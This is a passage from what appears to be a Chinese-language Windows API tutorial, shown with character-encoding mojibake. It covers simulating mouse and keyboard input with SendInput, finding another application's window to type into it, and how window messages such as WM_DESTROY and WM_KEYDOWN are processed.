‡å·¦é”®å•å‡»a mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); // ç‚¹ä¸‹å·¦é”® mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); // æ¾å¼€å·¦é”® // æ¨¡æ‹Ÿé”®ç›˜è¾“å…¥ &#x27;a&#x27; keybd_event(0x41, 0, 0, 0); // æŒ‰ä¸‹ &#x27;a&#x27; é”® keybd_event(0x41, 0, KEYEVENTF_KEYUP, 0); // æ¾å¼€ &#x27;a&#x27; é”® Sleep(1000); // æ¨¡æ‹Ÿé”®ç›˜è¾“å…¥ &#x27;b&#x27; keybd_event(0x42, 0, 0, 0); // æŒ‰ä¸‹ &#x27;b&#x27; é”® keybd_event(0x42, 0, KEYEVENTF_KEYUP, 0); // æ¾å¼€ &#x27;b&#x27; é”® Sleep(1000); // æ¨¡æ‹Ÿé”®ç›˜è¾“å…¥ &#x27;C&#x27; (Shift + &#x27;c&#x27;) keybd_event(VK_SHIFT, 0, 0, 0); // æŒ‰ä¸‹ Shift é”® keybd_event(0x43, 0, 0, 0); // æŒ‰ä¸‹ &#x27;c&#x27; é”® keybd_event(0x43, 0, KEYEVENTF_KEYUP, 0); // æ¾å¼€ &#x27;c&#x27; é”® keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0); // æ¾å¼€ Shift é”® return 0;&#125; è¿è¡Œåï¼Œä¼šåœ¨ç¼–è¯‘æ¡†ä¸­è¾“å…¥ä¸‰ä¸ªå­—æ¯ ç»¼åˆç»ƒä¹  ä½¿ç”¨CreateProcessåˆ›å»ºfgè¿›ç¨‹ï¼Œè·¯å¾„åœ¨E:\\temp\\ipmsg.exeï¼Œsleppç¡çœ ç­‰å¾…ä¸€ä¼š éå†æ‰€æœ‰æ‰“å¼€çš„çª—å£ï¼Œå¦‚æœæ‰¾åˆ°äº†fgï¼Œå°±åœæ­¢éå† å°†fgæ˜¾ç¤ºå‡ºæ¥ï¼Œè®¾ç½®é¼ æ ‡åœ¨ç¼–è¾‘æ¡†çš„ä½ç½®å·¦é”®ç‚¹å‡»ï¼Œç„¶åæ¨¡æ‹Ÿé”®ç›˜è¾“å…¥ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#include &lt;windows.h&gt;#include &lt;stdio.h&gt;// å›è°ƒå‡½æ•°ï¼Œç”¨äºæšä¸¾é¡¶å±‚çª—å£BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)&#123; char windowText[256]; GetWindowTextA(hwnd, windowText, sizeof(windowText)); // æ¯”è¾ƒçª—å£æ ‡é¢˜ if (strcmp(windowText, &quot;é£é¸½ä¼ ä¹¦ IP Messenger&quot;) == 0) &#123; HWND* phwnd = (HWND*)lParam; *phwnd = hwnd; return FALSE; // è¿”å› FALSE åœæ­¢æšä¸¾ &#125; return TRUE; // è¿”å› TRUE ç»§ç»­æšä¸¾&#125;int main()&#123; //// è¿›ç¨‹ä¿¡æ¯ç»“æ„ //STARTUPINFO si = &#123; 0 &#125;; //si.cb = sizeof(si); //PROCESS_INFORMATION pi = &#123; 0 &#125;; //// åˆ›å»ºfgè¿›ç¨‹ //if (!CreateProcess(&quot;E:\\\\temp\\\\ipmsg.exe&quot;, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi)) //&#123; // printf(&quot;åˆ›å»ºè¿›ç¨‹å¤±è´¥ &quot;); // return 1; //&#125; //// ç­‰ä¸€ä¼š //Sleep(10000); // æšä¸¾æ‰€æœ‰é¡¶å±‚çª—å£ï¼ŒæŸ¥æ‰¾fgçª—å£ HWND hwndFg = NULL; EnumWindows(EnumWindowsProc, (LPARAM)&amp;hwndFg); if (hwndFg == NULL) &#123; printf(&quot;æœªæ‰¾åˆ°fgçª—å£ &quot;); return 1; &#125; // å°†fgçª—å£æ˜¾ç¤ºå¹¶ç½®é¡¶ ShowWindow(hwndFg, SW_SHOW); SetForegroundWindow(hwndFg); // æŸ¥æ‰¾ç¼–è¾‘æ¡†å­æ§ä»¶ HWND hEdit = GetDlgItem(hwndFg, 0x3E9); if (hEdit == NULL) &#123; printf(&quot;æœªæ‰¾åˆ°ç¼–è¾‘æ¡† &quot;); return 1; &#125; // è·å–ç¼–è¾‘æ¡†çª—å£çš„åæ ‡ RECT r; GetWindowRect(hEdit, &amp;r); printf(&quot;ç¼–è¾‘æ¡†åæ ‡: %d, %d &quot;, r.left, r.top); // è®¾ç½®é¼ æ ‡çš„ä½ç½® SetCursorPos(r.left + 1, r.top + 1); Sleep(1000); // æ¨¡æ‹Ÿé¼ æ ‡å·¦é”®å•å‡» INPUT inputs[2] = &#123;&#125;; inputs[0].type = INPUT_MOUSE; inputs[0].mi.dwFlags = MOUSEEVENTF_LEFTDOWN; inputs[1].type = INPUT_MOUSE; inputs[1].mi.dwFlags = MOUSEEVENTF_LEFTUP; SendInput(ARRAYSIZE(inputs), inputs, sizeof(INPUT)); // æ¨¡æ‹Ÿé”®ç›˜è¾“å…¥ &#x27;a&#x27; INPUT keyInputs[2] = &#123;&#125;; keyInputs[0].type = INPUT_KEYBOARD; keyInputs[0].ki.wVk = &#x27;A&#x27;; keyInputs[1].type = INPUT_KEYBOARD; keyInputs[1].ki.wVk = &#x27;A&#x27;; keyInputs[1].ki.dwFlags = KEYEVENTF_KEYUP; SendInput(ARRAYSIZE(keyInputs), keyInputs, sizeof(INPUT)); Sleep(1000); // æ¨¡æ‹Ÿé”®ç›˜è¾“å…¥ &#x27;b&#x27; keyInputs[0].ki.wVk = &#x27;B&#x27;; keyInputs[1].ki.wVk = &#x27;B&#x27;; SendInput(ARRAYSIZE(keyInputs), keyInputs, sizeof(INPUT)); Sleep(1000); // æ¨¡æ‹Ÿé”®ç›˜è¾“å…¥ &#x27;C&#x27; (Shift + &#x27;c&#x27;) keyInputs[0].ki.wVk = VK_SHIFT; keyInputs[0].ki.dwFlags = 0; keyInputs[1].ki.wVk = VK_SHIFT; keyInputs[1].ki.dwFlags = KEYEVENTF_KEYUP; SendInput(ARRAYSIZE(keyInputs), keyInputs, sizeof(INPUT)); keyInputs[0].ki.wVk = &#x27;C&#x27;; keyInputs[0].ki.dwFlags = 0; keyInputs[1].ki.wVk = &#x27;C&#x27;; keyInputs[1].ki.dwFlags = KEYEVENTF_KEYUP; SendInput(ARRAYSIZE(keyInputs), keyInputs, sizeof(INPUT)); return 0;&#125; ä¸è¿‡fgè¿™ä¸ªæœ‰ç‚¹é—®é¢˜ï¼Œå°±æ˜¯fgä¸€å¯åŠ¨æ˜¯æœ€å°åŒ–ï¼Œéå†çª—å£ä¼šæ‰¾ä¸åˆ°ã€‚åªæœ‰ç‚¹å‡ºæ¥æ˜¾ç¤ºè¿‡ä¸€æ¬¡ï¼Œç”¨FindWindowæ‰èƒ½æ‰¾åˆ°è¿™ä¸ªçª—å£ã€‚"},{"title":"æ¶ˆæ¯ç±»å‹","path":"/wiki/Windows_API/æ¶ˆæ¯ç±»å‹.html","content":"å‰è¨€ æ¶ˆæ¯çš„äº§ç”Ÿä¸å¤„ç†æµç¨‹ å½“ç”¨æˆ·ç‚¹å‡»æŸä¸ªçª—å£ï¼Œè¿™ä¸ªè¡Œä¸ºå°±ä¼šäº§ç”Ÿä¸€ä¸ªæ¶ˆæ¯ï¼Œæ“ä½œç³»ç»Ÿæœ€å…ˆå¾—åˆ°è¿™ä¸ªæ¶ˆæ¯ï¼Œæ“ä½œç³»ç»Ÿä¼šåˆ¤æ–­è¿™ä¸ªæ¶ˆæ¯è¦å‘é€ç»™å“ªä¸ªçª—å£ï¼Œæ“ä½œç³»ç»Ÿæ‰¾åˆ°çª—å£åå°†è¿™ä¸ªæ¶ˆæ¯æ”¾åˆ°è¿™ä¸ªçª—å£å¯¹è±¡æ‰€å±çº¿ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚åº”ç”¨å±‚çš„GetMessageä¸åœåœ°ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­å–æ¶ˆæ¯ï¼Œå–å‡ºæ¥çš„æ¶ˆæ¯æ”¾åœ¨MSGç»“æ„ä½“ä¸­ã€‚ 1234567MSG msg; // msg: ç”¨äºæ¥æ”¶æ¶ˆæ¯çš„MSGç»“æ„ä½“GetMessage( &amp;msg, // &amp;msg: æŒ‡å‘MSGç»“æ„ä½“çš„æŒ‡é’ˆï¼Œç”¨äºå­˜å‚¨æ¥æ”¶åˆ°çš„æ¶ˆæ¯ NULL, // NULL: æŒ‡å®šè¦æ£€ç´¢çš„æ¶ˆæ¯çš„çª—å£å¥æŸ„ã€‚NULLè¡¨ç¤ºæ¥æ”¶ä»»ä½•çª—å£çš„æ¶ˆæ¯ 0, // 0: è¦æ£€ç´¢çš„ç¬¬ä¸€ä¸ªæ¶ˆæ¯çš„æœ€å°æ¶ˆæ¯å€¼ã€‚0è¡¨ç¤ºæ¥æ”¶æ‰€æœ‰ç±»å‹çš„æ¶ˆæ¯ 0 // 0: è¦æ£€ç´¢çš„æœ€åä¸€ä¸ªæ¶ˆæ¯çš„æœ€å¤§æ¶ˆæ¯å€¼ã€‚0åŒæ ·è¡¨ç¤ºæ¥æ”¶æ‰€æœ‰ç±»å‹çš„æ¶ˆæ¯); 12345678910typedef struct tagMSG&#123; HWND hwnd; // æ¶ˆæ¯æ‰€å±çª—å£çš„å¥æŸ„ UINT message; // æ¶ˆæ¯çš„æ ‡è¯†ç¬¦ï¼Œè¡¨ç¤ºä»€ä¹ˆç±»å‹çš„æ¶ˆæ¯ï¼Œå¦‚WM_PAINTã€WM_QUITç­‰ã€‚ WPARAM wParam; // ä¸æ¶ˆæ¯ç›¸å…³çš„é™„åŠ ä¿¡æ¯ã€‚å…·ä½“å«ä¹‰å–å†³äºæ¶ˆæ¯çš„ç±»å‹ã€‚ LPARAM lParam; // ä¸æ¶ˆæ¯ç›¸å…³çš„é™„åŠ ä¿¡æ¯ã€‚å…·ä½“å«ä¹‰å–å†³äºæ¶ˆæ¯çš„ç±»å‹ã€‚ DWORD time; // æ¶ˆæ¯è¢«åˆ›å»ºçš„æ—¶é—´ï¼ˆç³»ç»Ÿå¯åŠ¨åçš„æ¯«ç§’æ•°ï¼‰ã€‚ POINT pt; // æ¶ˆæ¯å‘ç”Ÿæ—¶çš„å…‰æ ‡ä½ç½®ï¼Œç›¸å¯¹äºå±å¹•çš„åæ ‡ã€‚ DWORD lPrivate; // ç§æœ‰å­—æ®µï¼Œç”¨äºæ“ä½œç³»ç»Ÿå†…éƒ¨ä½¿ç”¨ï¼Œåº”ç”¨ç¨‹åºé€šå¸¸ä¸ä½¿ç”¨æ­¤å­—æ®µã€‚&#125; MSG, *PMSG, *NPMSG, *LPMSG; ä»MSGç»“æ„ä½“ä¸­çš„HWNDæˆå‘˜å¯ä»¥çœ‹å‡ºï¼Œæ¶ˆæ¯æ˜¯é’ˆå¯¹çª—å£çš„ ä½†MSGæ¶ˆæ¯ç»“æ„ä½“ä¸­åªæœ‰çª—å£å¯¹è±¡çš„å¥æŸ„HWNDï¼Œæ²¡æœ‰çª—å£è¿‡ç¨‹å‡½æ•°çš„ä¿¡æ¯ã€‚æ‰€ä»¥éœ€è¦è°ƒç”¨DispatchMessage(&amp;msg)æ ¹æ®HWNDæ‰¾åˆ°çª—å£è¿‡ç¨‹å‡½æ•°ï¼ˆæ ¹æ®HWNDè¿›å†…æ ¸æŸ¥å…¨å±€çª—å£å¥æŸ„è¡¨ï¼Œæ‰¾åˆ°çª—å£å¯¹è±¡ï¼Œæ‰¾åˆ°è¿™ä¸ªçª—å£å¯¹è±¡çš„çª—å£è¿‡ç¨‹å‡½æ•°ï¼‰ã€‚æœ€åç”±å†…æ ¸å‘èµ·è°ƒç”¨ï¼Œæ‰§è¡Œçª—å£è¿‡ç¨‹å‡½æ•°ï¼ˆçª—å£è¿‡ç¨‹å‡½æ•°åœ¨æˆ‘ä»¬çš„ä»£ç ä¸­ï¼Œåœ¨åº”ç”¨å±‚ï¼Œåœ¨3ç¯ï¼Œæ‰€ä»¥ä¸‹å›¾æœ€åç®­å¤´æ˜¯ä»å†…æ ¸æŒ‡å‘åº”ç”¨å±‚çš„ï¼‰ï¼Œå°†æ¶ˆæ¯å¤„ç†æ‰ã€‚ è€Œä¸”ï¼Œå¯ä»¥å‘ç°çª—å£è¿‡ç¨‹å‡½æ•°çš„å››ä¸ªå‚æ•°å°±æ˜¯MSGæ¶ˆæ¯ç»“æ„ä½“å‰å››ä¸ªå­—æ®µã€‚ 1234567891011typedef struct tagMSG&#123; HWND hwnd; // æ¶ˆæ¯æ‰€å±çª—å£çš„å¥æŸ„ UINT message; // æ¶ˆæ¯çš„æ ‡è¯†ç¬¦ï¼Œè¡¨ç¤ºä»€ä¹ˆç±»å‹çš„æ¶ˆæ¯ï¼Œå¦‚WM_PAINTã€WM_QUITç­‰ã€‚ WPARAM wParam; // ä¸æ¶ˆæ¯ç›¸å…³çš„é™„åŠ ä¿¡æ¯ã€‚å…·ä½“å«ä¹‰å–å†³äºæ¶ˆæ¯çš„ç±»å‹ã€‚ LPARAM lParam; // ä¸æ¶ˆæ¯ç›¸å…³çš„é™„åŠ ä¿¡æ¯ã€‚å…·ä½“å«ä¹‰å–å†³äºæ¶ˆæ¯çš„ç±»å‹ã€‚ DWORD time; // æ¶ˆæ¯è¢«åˆ›å»ºçš„æ—¶é—´ï¼ˆç³»ç»Ÿå¯åŠ¨åçš„æ¯«ç§’æ•°ï¼‰ã€‚ POINT pt; // æ¶ˆæ¯å‘ç”Ÿæ—¶çš„å…‰æ ‡ä½ç½®ï¼Œç›¸å¯¹äºå±å¹•çš„åæ ‡ã€‚ DWORD lPrivate; // ç§æœ‰å­—æ®µï¼Œç”¨äºæ“ä½œç³»ç»Ÿå†…éƒ¨ä½¿ç”¨ï¼Œåº”ç”¨ç¨‹åºé€šå¸¸ä¸ä½¿ç”¨æ­¤å­—æ®µã€‚&#125; MSG, *PMSG, *NPMSG, *LPMSG; å¯ä»¥ç†è§£ä¸ºåˆ†å‘æ¶ˆæ¯åï¼ŒMSGé‡Œçš„timeå’Œptæˆå‘˜æ˜¯ç»™æ“ä½œç³»ç»Ÿç”¨çš„ï¼Œæ“ä½œç³»ç»Ÿä½¿ç”¨åˆ°äº†è¿™äº›æˆå‘˜ï¼Œæ”¾ç½®åˆ°äº†ç›¸åº”çº¿ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚åé¢ç³»ç»Ÿè°ƒç”¨æˆ‘ä»¬å†™çš„çª—å£è¿‡ç¨‹å‡½æ•°ï¼Œçª—å£è¿‡ç¨‹å‡½æ•°ç”¨ä¸åˆ°ç»™ç³»ç»Ÿç”¨çš„è¿™äº›æˆå‘˜ï¼Œæ‰€ä»¥çª—å£è¿‡ç¨‹å‡½æ•°ä¸­çš„å‚æ•°æ˜¯MSGçš„ä¸€éƒ¨åˆ†ï¼Œåªæœ‰çª—å£è¿‡ç¨‹å‡½æ•°è¦ç”¨åˆ°çš„æˆå‘˜ï¼š 1234567LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); // é»˜è®¤çª—å£å¤„ç†å‡½æ•°&#125; èƒ½äº§ç”Ÿæ¶ˆæ¯çš„å››ç§æƒ…å†µï¼šé¼ æ ‡ï¼Œé”®ç›˜ï¼Œå…¶ä»–çš„åº”ç”¨ç¨‹åºï¼Œæ“ä½œç³»ç»Ÿçš„å†…æ ¸ç¨‹åºã€‚æ¯ç§æ¶ˆæ¯éƒ½æœ‰ä¸€ä¸ªç¼–å·ï¼Œå¯¹åº”çš„å­—æ®µæ˜¯MSG.messageã€‚æœ¬å°èŠ‚å°±æ˜¯è®²è§£æ¶ˆæ¯ç±»å‹ã€‚ æ¶ˆæ¯ç±»å‹ ä½“ä¼šæ¶ˆæ¯ å®éªŒï¼šåœ¨çª—å£è¿‡ç¨‹å‡½æ•°ä¸­æ‰“å°uMsgå­—æ®µï¼Œä½“ä¼šä¸‹æ¶ˆæ¯ 1234567891011LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; char szOutBuff[0x80]; sprintf(szOutBuff, &quot;Message: %x - %x &quot;, hwnd, uMsg); OutputDebugString(szOutBuff); return DefWindowProc(hwnd, uMsg, wParam, lParam); // é»˜è®¤çª—å£å¤„ç†å‡½æ•°&#125; è¿è¡Œåè¿˜æ²¡å¯¹çª—å£æœ‰æ“ä½œï¼ˆå‘æ¶ˆæ¯ï¼‰ï¼Œå°±å·²ç»çœ‹åˆ°æœ‰å¾ˆå¤šæ¶ˆæ¯äº†ã€‚è¯´æ˜ï¼šæ¶ˆæ¯æ˜¯æ—¶åˆ»åœ¨äº§ç”Ÿçš„ã€‚é™¤äº†ç”¨æˆ·çš„é¼ æ ‡ï¼Œé”®ç›˜ï¼Œè¿˜å¯èƒ½æœ‰å…¶ä»–çš„åº”ç”¨ç¨‹åºï¼Œæ“ä½œç³»ç»Ÿå†…æ ¸ç¨‹åºå‘çš„æ¶ˆæ¯ã€‚ æ¯ä¸ªuMsgå­—æ®µéƒ½å¯¹åº”ç€ä¸€ç§æ¶ˆæ¯ï¼Œæ¯”å¦‚1å°±æ˜¯å¯¹åº”WM_CREATEï¼Œæ„æ€å°±æ˜¯çª—å£è¢«åˆ›å»ºã€‚ WMï¼šWindowsMessageï¼Œçª—å£æ¶ˆæ¯çš„ç¼©å†™ 1#define WM_CREATE 0x0001 å¤„ç†çª—å£å…³é—­æ¶ˆæ¯ ç¨‹åºè¿è¡Œåï¼Œç”¨æˆ·å¯ä»¥å¯¹çª—å£è¿›è¡Œæ‹–åŠ¨ï¼Œæœ€å°åŒ–ï¼Œæœ€å¤§åŒ–ç­‰æ“ä½œï¼Œè¿™æ˜¯å› ä¸ºç¨‹åºç”¨äº†é»˜è®¤çª—å£è¿‡ç¨‹å‡½æ•°æ¥å¤„ç†äº†è¿™äº›æ¶ˆæ¯DefWindowProc(hwnd, uMsg, wParam, lParam);ã€‚è€Œåœ¨å®é™…å¼€å‘ä¸­ï¼Œé’ˆå¯¹è‡ªå·±éœ€è¦çš„æ¶ˆæ¯è¿›è¡Œå¤„ç†å³å¯ï¼Œå…¶ä»–çš„å°±äº¤ç»™é»˜è®¤çš„çª—å£è¿‡ç¨‹å‡½æ•°ã€‚æ¯”å¦‚è¿™é‡Œæˆ‘ä»¬å¤„ç†ä¸€ä¸‹çª—å£é€€å‡ºçš„æ¶ˆæ¯WM_DESTROYã€‚ 12345678910111213141516LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; switch (uMsg) &#123; case WM_DESTROY: // å½“çª—å£å…³é—­åˆ™é€€å‡ºè¿›ç¨‹ &#123; PostQuitMessage(0); break; &#125; &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam); // é»˜è®¤çª—å£å¤„ç†å‡½æ•°&#125; æœ‰äº†ä¸Šé¢case WM_DESTROY: é‚£æ®µå¯¹çª—å£é€€å‡ºçš„å¤„ç†ä»£ç ï¼Œå½“ç”¨æˆ·ç‚¹å‡»çª—å£å…³é—­æŒ‰é’®æ—¶ï¼Œè¿›ç¨‹ä¼šä¸€å—é€€å‡ºã€‚æ²¡åŠ è¿™æ®µä»£ç ä¹‹å‰ï¼Œå…³é—­çª—å£å°±åªæ˜¯å…³é—­çª—å£ï¼Œè€Œè¿›ç¨‹è¿˜åœ¨ï¼ˆå…³é—­çª—å£åçª—å£çœ‹ä¸è§äº†ï¼Œä½†è¿›ç¨‹ç®¡ç†å™¨ä¸­è¿˜èƒ½çœ‹åˆ°è¿›ç¨‹ï¼‰ã€‚ å¤„ç†é”®ç›˜æ¶ˆæ¯ é”®ç›˜æŒ‰ä¸‹æ¶ˆæ¯æ˜¯WM_KEYDOWNã€‚å½“uMsgæ˜¯WM_KEYDOWNæ¶ˆæ¯æ—¶ wParamï¼šThe virtual-key code of the nonsystem key. See Virtual-Key Codes. lParamï¼šåŒ…å«äº†ä¸æŒ‰é”®äº‹ä»¶ç›¸å…³çš„é¢å¤–ä¿¡æ¯ 0-15ä½ï¼šé‡å¤è®¡æ•°ï¼ˆè¡¨ç¤ºè‡ªä¸Šæ¬¡æ¶ˆæ¯ä»¥æ¥æŒ‰é”®è¢«æŒ‰ä¸‹çš„æ¬¡æ•°ï¼‰ 16-23ä½ï¼šæ‰«æç ï¼ˆè¡¨ç¤ºæŒ‰é”®çš„ç¡¬ä»¶æ‰«æç ï¼‰ 24ä½ï¼šæ‰©å±•é”®æ ‡å¿—ï¼ˆå¦‚æœæ˜¯ç”±æ‰©å±•é”®ç”Ÿæˆçš„ï¼Œåˆ™è¯¥ä½ä¸º1ï¼‰ 25-28ä½ï¼šä¿ç•™ï¼Œä¸ä½¿ç”¨ 29ä½ï¼šä¸Šä¸‹æ–‡ä»£ç ï¼ˆå¦‚æœåœ¨ä¸­æ–­æ—¶å‘å‡ºï¼Œåˆ™è¯¥ä½ä¸º1ï¼‰ 30ä½ï¼šå…ˆå‰çš„é”®çŠ¶æ€ï¼ˆå¦‚æœæŒ‰é”®ä¹‹å‰å·²ç»æŒ‰ä¸‹ï¼Œåˆ™ä¸º1ï¼›å¦‚æœä¹‹å‰æœªæŒ‰ä¸‹ï¼Œåˆ™ä¸º0ï¼‰ 31ä½ï¼šè½¬æ¢çŠ¶æ€ï¼ˆå¦‚æœæ¶ˆæ¯æ˜¯ç”±è½¬æ¢çŠ¶æ€ï¼ˆä¾‹å¦‚å°†éå­—ç¬¦é”®è½¬æ¢ä¸ºå­—ç¬¦é”®ï¼‰ç”Ÿæˆçš„ï¼Œåˆ™è¯¥ä½ä¸º1ï¼‰ For more detail, see Keystroke Message Flags. æ³¨æ„ï¼Œé”®ç›˜åŸç”Ÿçš„æ¶ˆæ¯æ˜¯virtual-key messagesï¼ˆè™šæ‹Ÿé”®æ¶ˆæ¯ï¼‰ã€‚å¦‚æœæƒ³å¾—åˆ°character messagesï¼ˆå­—ç¬¦æ¶ˆæ¯ï¼‰ï¼Œé‚£ä¹ˆåœ¨DispatchMessageåˆ†å‘æ¶ˆæ¯å‰éœ€è¦è°ƒç”¨TranslateMessageè¿›è¡Œæ¶ˆæ¯è½¬æ¢ï¼ˆTranslates virtual-key messages into character messages.ï¼‰ å‰é¢æœ‰è¿›è¡Œæ¶ˆæ¯ç¿»è¯‘TranslateMessage(&msg); è¿™é‡Œä»£ç ç•¥1234567891011121314151617LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; switch (uMsg) &#123; // å½“é”®ç›˜æŒ‰ä¸‹åˆ™å¤„ç† case WM_KEYDOWN: &#123; char szOutBuff[0x80]; sprintf(szOutBuff, &quot;Message: %x - %x - %x &quot;, uMsg, wParam, lParam); OutputDebugString(szOutBuff); &#125; &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam); // é»˜è®¤çª—å£å¤„ç†å‡½æ•°&#125; 123456 1e0001 0000 0000 0001 1110 0000 0000 0000 0001 401e0001 0100 0000 0001 1110 0000 0000 0000 0001ç¬¬30ä½ä¸º1ï¼Œè¡¨ç¤ºå…ˆå‰çš„é”®å·²æŒ‰ä¸‹ lParamå­—æ®µè§£è¯»ï¼š ç¬¬ä¸€æ¡æ¶ˆæ¯1e0001ï¼š é‡å¤è®¡æ•°ï¼š0x0001ï¼ˆ1æ¬¡ï¼‰ æ‰«æç ï¼š0x001eï¼ˆé€šå¸¸æ˜¯å­—æ¯â€œAâ€çš„æ‰«æç ï¼‰ æ‰©å±•é”®æ ‡å¿—ï¼š0ï¼ˆä¸æ˜¯æ‰©å±•é”®ï¼‰ å…ˆå‰çš„é”®çŠ¶æ€ï¼š0ï¼ˆä¹‹å‰æœªæŒ‰ä¸‹ï¼‰ è½¬æ¢çŠ¶æ€ï¼š0ï¼ˆä¸æ˜¯ç”±è½¬æ¢çŠ¶æ€ç”Ÿæˆçš„ï¼‰ è¿™æ¡æ¶ˆæ¯è¡¨ç¤ºé”®ç›˜ä¸Šçš„â€œAâ€é”®è¢«é¦–æ¬¡æŒ‰ä¸‹ã€‚ ç¬¬äºŒæ¡æ¶ˆæ¯401e0001ï¼š é‡å¤è®¡æ•°ï¼š0x0001ï¼ˆ1æ¬¡ï¼‰ æ‰«æç ï¼š0x001eï¼ˆä»æ˜¯â€œAâ€é”®ï¼‰ æ‰©å±•é”®æ ‡å¿—ï¼š0ï¼ˆä¸æ˜¯æ‰©å±•é”®ï¼‰ å…ˆå‰çš„é”®çŠ¶æ€ï¼š1ï¼ˆä¹‹å‰å·²ç»æŒ‰ä¸‹ï¼‰ è½¬æ¢çŠ¶æ€ï¼š0ï¼ˆä¸æ˜¯ç”±è½¬æ¢çŠ¶æ€ç”Ÿæˆçš„ï¼‰ è¿™æ¡æ¶ˆæ¯è¡¨ç¤ºâ€œAâ€é”®ä»ç„¶è¢«æŒ‰ä½ï¼Œå®ƒæ˜¯è‡ªé”®ç›˜ä¸Šæ¬¡è¢«æŒ‰ä¸‹ä»¥æ¥çš„å¦ä¸€ä¸ªæ¶ˆæ¯ã€‚ å› æ­¤ï¼Œè¿™ä¸¤æ¡æ¶ˆæ¯è¡¨æ˜ç”¨æˆ·å…ˆæŒ‰ä¸‹äº†â€œAâ€é”®ï¼Œç„¶åä¸€ç›´æŒ‰ä½æœªé‡Šæ”¾ã€‚è¿™ç§è¡Œä¸ºåœ¨é•¿æ—¶é—´æŒ‰ä½æŸä¸ªé”®æ—¶æ˜¯å…¸å‹çš„ï¼Œé¦–å…ˆä¼šæ¥æ”¶åˆ°ä¸€ä¸ªæŒ‰é”®é¦–æ¬¡æŒ‰ä¸‹çš„æ¶ˆæ¯ï¼Œéšåå¦‚æœæŒ‰é”®ç»§ç»­ä¿æŒæŒ‰ä¸‹çŠ¶æ€ï¼Œä¼šå‘¨æœŸæ€§åœ°æ¥æ”¶åˆ°æ›´å¤šæ­¤ç±»æ¶ˆæ¯ã€‚ WM_KEYDOWNå’ŒWM_CHARæ¶ˆæ¯çš„åŒºåˆ«WM_KEYDOWNå’ŒWM_CHARæ˜¯Windowsç¼–ç¨‹ä¸­ç”¨äºå¤„ç†é”®ç›˜è¾“å…¥çš„ä¸¤ç§ä¸åŒç±»å‹çš„æ¶ˆæ¯ï¼Œå®ƒä»¬åœ¨å¤„ç†é”®ç›˜äº‹ä»¶æ—¶æœ‰ç€æ˜æ˜¾çš„åŒºåˆ«ï¼šWM_KEYDOWN:è¿™æ˜¯ä¸€ä¸ªè™šæ‹Ÿé”®æ¶ˆæ¯ï¼Œå½“ç”¨æˆ·æŒ‰ä¸‹é”®ç›˜ä¸Šçš„ä»»ä½•é”®æ—¶ï¼Œå°±ä¼šè§¦å‘WM_KEYDOWNæ¶ˆæ¯ã€‚å®ƒæä¾›äº†è™šæ‹Ÿé”®ç ï¼ˆwParamå‚æ•°ï¼‰ï¼Œè¡¨ç¤ºè¢«æŒ‰ä¸‹çš„é”®ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæŒ‰ä¸‹å›è½¦é”®ï¼Œè™šæ‹Ÿé”®ç å°†æ˜¯VK_RETURNã€‚WM_KEYDOWNæ¶ˆæ¯ç”¨äºå¤„ç†é”®ç›˜ä¸Šçš„éå­—ç¬¦é”®ï¼ˆå¦‚åŠŸèƒ½é”®ã€æ§åˆ¶é”®ç­‰ï¼‰ä»¥åŠå­—ç¬¦é”®ã€‚lParamå‚æ•°æä¾›äº†å…³äºæŒ‰é”®äº‹ä»¶çš„é¢å¤–ä¿¡æ¯ï¼Œå¦‚æŒ‰é”®çš„é‡å¤è®¡æ•°ã€æ‰«æç ã€æ˜¯å¦æ˜¯æ‰©å±•é”®ç­‰ã€‚WM_CHAR:è¿™æ˜¯ä¸€ä¸ªå­—ç¬¦æ¶ˆæ¯ï¼Œå½“ç”¨æˆ·æŒ‰ä¸‹èƒ½äº§ç”Ÿå­—ç¬¦çš„é”®æ—¶ï¼Œå°±ä¼šè§¦å‘WM_CHARæ¶ˆæ¯ã€‚WM_CHARæ¶ˆæ¯é€šè¿‡wParamå‚æ•°æä¾›å®é™…çš„å­—ç¬¦ä»£ç 